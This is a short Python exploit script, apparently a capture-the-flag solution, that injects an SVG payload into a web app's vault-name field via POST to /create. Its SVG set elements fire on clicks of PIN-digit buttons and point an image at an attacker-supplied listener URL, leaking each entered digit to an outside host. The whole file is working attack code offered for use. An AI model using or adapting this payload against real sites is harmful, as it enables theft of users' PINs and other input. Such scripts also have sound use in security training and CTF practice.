#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: Mika

from requests import post
from sys import argv

if len(argv) < 3:
    print(f"Usage: {argv[0]} <chall_url> <listener_link>")
    exit()

chall = argv[1]
listener = argv[2]

payload_base = f'<svg><image href="/"><set begin="pinPIN_NUM.click" attributeName=href to="{listener}/?pin=PIN_NUM"></set></image></svg>'
payload_final = ''.join([payload_base.replace('PIN_NUM', str(i)) for i in range(10)])

print(f"[*] Payload:\n {payload_final} \n {'-'*50}")
ans = input("[?] Ready to send payload? (y/n): ")
if ans.lower() != 'y':
    print("[!] Exiting...")
    exit()

print("[*] Sending payload...")
post(chall + '/create', data={'vaultName': payload_final, 'pinCode': '1337'})